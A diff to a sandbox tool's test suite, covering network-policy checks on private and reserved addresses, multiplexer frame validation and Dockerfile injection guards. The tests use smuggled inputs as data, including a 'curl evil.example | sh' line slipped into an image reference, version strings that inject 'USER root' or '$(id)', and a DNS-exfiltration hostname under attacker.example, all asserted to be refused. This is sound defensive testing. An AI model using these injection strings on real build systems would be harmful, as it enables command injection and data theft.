@@ -19,10 +19,12 @@ import {
   contextFiles,
   dockerfileTag,
   dockerignoreMatcher,
+  harnessImageFor,
   installLayerTag,
   installScript,
   pluginBuildScript,
   sourceTreeHash,
+  versionLabel,
 } from '../src/build-image.ts'
 import {
   docker,
@@ -318,15 +320,19 @@ describe('network policy', () => {
     const rebound = async (host: string) =>
       host.endsWith('.rebind.example') ? [host.startsWith('v6') ? 'fd00::1' : '10.0.0.5'] : []
     const check = createPolicyCheck(
-      { mode: 'custom', allowedHosts: ['*.rebind.example', 'intranet.rebind.example'] },
+      {
+        mode: 'custom',
+        allowedHosts: ['*.rebind.example', 'intranet.rebind.example'],
+        allowedCIDRs: ['10.0.0.0/8', 'fc00::/7'],
+      },
       { lookup: rebound },
     )
     for (const host of ['a.rebind.example', 'v6.rebind.example']) {
       const verdict = await check(host)
       assert.equal(verdict.allowed, false, host)
-      assert.match(!verdict.allowed ? verdict.reason : '', /private address/)
+      assert.match(!verdict.allowed ? verdict.reason : '', /\*\. pattern/)
     }
-    // Twin: a host listed by name is trusted to resolve where it does.
+    // Twin: a host listed by name, in an allowed range, is trusted to resolve where it does.
     assert.deepEqual(await check('intranet.rebind.example'), {
       allowed: true,
       address: '10.0.0.5',
@@ -370,6 +376,75 @@ describe('network policy', () => {
     }
     const loose = createPolicyCheck({ mode: 'allow-all' }, { lookup, allowLoopback: true })
     assert.equal((await loose('sneaky.example')).allowed, true)
+  })
+
+  const RESERVED = [
+    '10.1.2.3',
+    '172.17.0.1',
+    '192.168.1.10',
+    '100.100.100.200',
+    '[fd00:ec2::254]',
+    'fc00::1',
+    '224.0.0.1',
+    '255.255.255.255',
+    '[ff02::1]',
+    '[64:ff9b::808:808]',
+    '[::ffff:192.168.1.1]',
+    'internal.corp',
+  ]
+
+  test('allow-all refuses private, CGNAT, unique-local, multicast, broadcast and NAT64 addresses', async () => {
+    const check = createPolicyCheck({ mode: 'allow-all' }, { lookup })
+    for (const host of RESERVED) {
+      const verdict = await check(host)
+      assert.equal(verdict.allowed, false, host)
+      assert.equal(!verdict.allowed && verdict.status, 403, host)
+      assert.match(!verdict.allowed ? verdict.reason : '', /private or reserved address/, host)
+    }
+    // allowLoopback is for the host's loopback only: these stay refused with it.
+    const loose = createPolicyCheck({ mode: 'allow-all' }, { lookup, allowLoopback: true })
+    for (const host of RESERVED) assert.equal((await loose(host)).allowed, false, host)
+    // Twin: the public addresses just outside each range go through.
+    for (const host of ['8.8.8.8', '172.32.0.1', '100.128.0.1', '11.0.0.1', '[2606:4700::1]']) {
+      assert.equal((await check(host)).allowed, true, host)
+    }
+  })
+
+  test('custom: a private or reserved address needs an allowedCIDRs entry, listed or not', async () => {
+    const hosts = ['internal.corp', '10.1.2.3', '255.255.255.255']
+    const listed = createPolicyCheck({ mode: 'custom', allowedHosts: hosts }, { lookup })
+    for (const host of hosts) {
+      const verdict = await listed(host)
+      assert.equal(verdict.allowed, false, host)
+      assert.match(!verdict.allowed ? verdict.reason : '', /private or reserved address/, host)
+    }
+    // Twin: with the range allowed, the same hosts go through.
+    const ranged = createPolicyCheck(
+      { mode: 'custom', allowedHosts: hosts, allowedCIDRs: ['10.0.0.0/8', '255.255.255.255/32'] },
+      { lookup },
+    )
+    for (const host of hosts) assert.equal((await ranged(host)).allowed, true, host)
+  })
+
+  test('NAT64: the embedded IPv4 address is checked as well as the prefix', async () => {
+    const check = createPolicyCheck(
+      { mode: 'custom', allowedHosts: ['nat64.example'], allowedCIDRs: ['64:ff9b::/96'] },
+      { lookup: async () => ['64:ff9b::7f00:1'] },
+    )
+    for (const host of ['[64:ff9b::7f00:1]', '64:ff9b::127.0.0.1', '[64:ff9b::a9fe:a9fe]']) {
+      const verdict = await check(host)
+      assert.equal(verdict.allowed, false, host)
+      assert.match(!verdict.allowed ? verdict.reason : '', /loopback or link-local/, host)
+    }
+    const verdict = await check('nat64.example')
+    assert.match(!verdict.allowed ? verdict.reason : '', /loopback or link-local/)
+    const private10 = await check('[64:ff9b::a00:1]')
+    assert.match(!private10.allowed ? private10.reason : '', /private or reserved address/)
+    // Twin: a public embedded address in an allowed NAT64 range goes through.
+    assert.deepEqual(await check('[64:ff9b::808:808]'), {
+      allowed: true,
+      address: '64:ff9b::808:808',
+    })
   })
 
   test('deny list: every always-denied form, under every policy', async () => {
@@ -418,14 +493,34 @@ describe('network policy', () => {
       reason: "unresolvable.invalid isn't in the allowlist",
     })
     assert.deepEqual(asked, [])
-    // Twin: a listed host is looked up, and so is any host when the policy allows CIDRs.
+    // Twin: a listed host is looked up.
     assert.equal((await check('github.com')).allowed, true)
-    const cidrs = createPolicyCheck(
-      { mode: 'custom', allowedCIDRs: ['10.0.0.0/8'] },
-      { lookup: counting },
+    assert.deepEqual(asked, ['github.com'])
+  })
+
+  test('allowed CIDRs match addresses: an unlisted name is refused without a lookup', async () => {
+    const asked: string[] = []
+    const check = createPolicyCheck(
+      { mode: 'custom', allowedCIDRs: ['10.0.0.0/8', '93.184.216.0/24'] },
+      {
+        lookup: async (host) => {
+          asked.push(host)
+          return lookup(host)
+        },
+      },
     )
-    assert.equal((await cidrs('internal.corp')).allowed, true)
-    assert.deepEqual(asked, ['github.com', 'internal.corp'])
+    // A name under a domain someone else controls would carry data out in the lookup itself.
+    for (const host of ['internal.corp', 'mfrggzdfmztwq2lk.attacker.example']) {
+      const verdict = await check(host)
+      assert.equal(verdict.allowed, false, host)
+      assert.match(!verdict.allowed ? verdict.reason : '', /isn't in the allowlist/, host)
+    }
+    assert.deepEqual(asked, [])
+    // Twin: an address in an allowed range goes through, and one outside doesn't.
+    assert.deepEqual(await check('10.1.2.3'), { allowed: true, address: '10.1.2.3' })
+    assert.equal((await check('93.184.216.34')).allowed, true)
+    assert.equal((await check('8.8.8.8')).allowed, false)
+    assert.deepEqual(asked, [])
   })
 
   test('deny-all denies everything', async () => {
@@ -605,6 +700,59 @@ describe('stdio mux', () => {
     pair.destroy(new Error('boom'))
     await broken
     assert.equal(other.destroyed, true)
+  })
+
+  test('a malformed frame stops the mux with a reason instead of throwing', () => {
+    const header = (type: number, id: number, length: number) => {
+      const b = Buffer.alloc(9)
+      b.writeUInt8(type, 0)
+      b.writeUInt32BE(id, 1)
+      b.writeUInt32BE(length, 5)
+      return b
+    }
+    const bad: [string, Buffer, RegExp][] = [
+      ['an empty OPEN', header(1, 1, 0), /OPEN.*2 bytes/],
+      ['a short WINDOW', Buffer.concat([header(5, 2, 2), Buffer.alloc(2)]), /WINDOW.*4 bytes/],
+      ['a FIN with a payload', Buffer.concat([header(3, 2, 1), Buffer.alloc(1)]), /FIN.*0 bytes/],
+      ['an unknown type', header(9, 2, 0), /type 9/],
+      ['an OPEN with our own parity', Buffer.concat([header(1, 2, 2), Buffer.alloc(2)]), /OPEN/],
+      // Only the header has arrived: refused before the payload is buffered.
+      ['a 2 GiB frame', header(2, 2, 0x7fffffff), /too large/],
+    ]
+    for (const [name, frame, reason] of bad) {
+      const errors: string[] = []
+      const mux = createMux({
+        Duplex,
+        parity: 0,
+        send: () => {},
+        onOpen: () => {},
+        onError: (message) => errors.push(message),
+      })
+      const stream = mux.open(43128)
+      assert.doesNotThrow(() => mux.receive(frame), name)
+      assert.equal(errors.length, 1, name)
+      assert.match(errors[0] ?? '', reason, name)
+      assert.equal(stream.destroyed, true, `${name}: open streams are torn down`)
+      // Later bytes are ignored, so one bad frame reports once.
+      mux.receive(header(6, 0, 0))
+      assert.equal(errors.length, 1, name)
+    }
+    // Twin: the same frames well formed are accepted.
+    const errors: string[] = []
+    const opened: number[] = []
+    const mux = createMux({
+      Duplex,
+      parity: 0,
+      send: () => {},
+      onOpen: (_s, port) => opened.push(port),
+      onError: (message) => errors.push(message),
+    })
+    const port = Buffer.alloc(2)
+    port.writeUInt16BE(43210, 0)
+    mux.receive(Buffer.concat([header(1, 1, 2), port, header(5, 1, 4), Buffer.alloc(4)]))
+    mux.receive(Buffer.concat([header(2, 1, 3), Buffer.from('abc'), header(3, 1, 0)]))
+    assert.deepEqual(errors, [])
+    assert.deepEqual(opened, [43210])
   })
 
   test('the forwarder script is self-contained JavaScript', () => {
@@ -1050,6 +1198,35 @@ describe('image recipes', () => {
     assert.equal(r.status, 1)
     assert.match(r.stderr, /reeval: build cwd nope isn't a directory in the source/)
     assert.equal(existsSync(join(src, 'ran.txt')), false, 'no command ran from elsewhere')
+  })
+
+  test('a from with whitespace or a line break is refused, not written into the Dockerfile', () => {
+    for (const from of ['node:24\nRUN curl evil.example | sh', 'node:24 AS x', '\tnode:24', '']) {
+      assert.throws(() => harnessImageFor('cursor', from), /from/, JSON.stringify(from))
+    }
+    // Twin: ordinary references, digests included, are accepted.
+    for (const from of ['node:24', `ghcr.io/acme/tool:1.2@sha256:${'a'.repeat(64)}`]) {
+      assert.match(harnessImageFor('cursor', from), /^reeval-sandbox:cursor-/)
+    }
+  })
+
+  test("a CLI's version output becomes a label value that can't add instructions", () => {
+    for (const hostile of [
+      '1.2.3" maintainer="x',
+      '1.2.3\nUSER root',
+      '1.2.3\\" LABEL a=b',
+      '1.2.3 $(id) `id` $' + '{HOME}',
+    ]) {
+      const label = versionLabel(hostile)
+      assert.doesNotMatch(label, /["\\\n\r$`]/, JSON.stringify(hostile))
+      assert.match(label, /^1\.2\.3/)
+    }
+    // Twin: ordinary version lines are kept as they are.
+    for (const version of ['2.1.3 (Claude Code)', 'codex-cli 0.46.0', 'v1.0.0-beta.2+build.7']) {
+      assert.equal(versionLabel(version), version)
+    }
+    assert.equal(versionLabel(`9.9.9 ${'x'.repeat(500)}`).length, 100)
+    assert.equal(versionLabel(''), 'unknown')
   })
 
   test('install commands run in order from /, in one script, stopping at the first failure', () => {
